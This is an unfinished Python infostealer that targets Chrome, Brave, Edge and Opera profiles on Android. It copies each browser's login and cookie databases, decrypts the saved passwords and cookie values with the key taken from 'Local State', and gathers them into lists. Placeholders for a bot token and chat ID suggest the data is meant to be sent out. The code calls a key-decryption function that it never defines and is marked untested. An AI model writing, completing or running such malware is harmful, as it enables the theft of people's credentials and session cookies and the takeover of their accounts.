# NOT TESTED & NOT FINISHED

import os
import shutil
import sqlite3
import base64
import json
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from typing import List

TOKEN = '%token%'
CHAT_ID = '%chatid%'

class ListFonction:
    Cards = list()
    Cookies = list()
    Passwords = list()
    Autofills = list()
    ClipBoard = list()
    Network = list()
    InstalledSoftware = list()
    Processes = list()
    TasksList = list()
    SystemInfo = list()
    PasswordManager = list()
    WalletsCounts = list()

class AndroidApi:
    @staticmethod
    def GetKey(file_path: str) -> bytes:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
            json_content = json.load(file)
            encrypted_key = json_content["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key.encode())[5:]
            return AndroidApi.decrypt_key(encrypted_key)

    @staticmethod
    def DecryptValue(encrypted_value: bytes, encrypted_key: bytes) -> str:
        try:
            version = encrypted_value.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = encrypted_value[3:15]
                password = encrypted_value[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(encrypted_key), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return "Decryption failed"
        except Exception as e:
            return f"Decryption Error: {str(e)}"

class GetData:
    def __init__(self):
        self.profiles_full_path = []
        self.local_data = os.getenv('HOME')
        self.temp = '/data/local/tmp'

    def list_profiles(self) -> None:
        try:
            directories = {
                "Chrome": os.path.join(self.local_data, "app_chrome", "Default"),
                "Brave": os.path.join(self.local_data, "app_brave", "Default"),
                "Edge": os.path.join(self.local_data, "app_edge", "Default"),
                "Opera": os.path.join(self.local_data, "app_opera", "Default"),
            }
            for name, directory in directories.items():
                if os.path.isdir(directory):
                    self.profiles_full_path.append(directory)

        except Exception as e:
            print(f"Error listing profiles: {str(e)}")
            pass

    def get_passwords(self) -> None:
        try:
            for path in self.profiles_full_path:
                key = AndroidApi.GetKey(os.path.join(path, "Local State"))
                login_data = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.temp, "Logins.db")
                shutil.copyfile(login_data, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()

                for login in logins:
                    if login[0] and login[1] and login[2]:
                        ListFonction.Passwords.append(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {AndroidApi.DecryptValue(login[2], key)}\n")
                cursor.close()
                database_connection.close()
                os.remove(copied_file_path)
        except Exception as e:
            print(f"Error getting passwords: {str(e)}")
            pass

    def get_cookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                key = AndroidApi.GetKey(os.path.join(path, "Local State"))
                cookie_data = os.path.join(path, "Cookies")
                copied_file_path = os.path.join(self.temp, "Cookies.db")
                shutil.copyfile(cookie_data, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value from cookies')
                cookies = cursor.fetchall()

                for cookie in cookies:
                    decrypted_cookie = AndroidApi.DecryptValue(cookie[3], key)
                    ListFonction.Cookies.append(f"Host: {cookie[0]}\nCookie Name: {cookie[1]}\nDecrypted Value: {decrypted_cookie}\n")
                cursor.close()
                database_connection.close()
                os.remove(copied_file_path)
        except Exception as e:
            print(f"Error getting cookies: {str(e)}")
            pass

    def run_all(self) -> None:
        self.list_profiles()
        self.get_passwords()
        self.get_cookies()

if __name__ == "__main__":
    data_collector = GetData()
    data_collector.run_all()
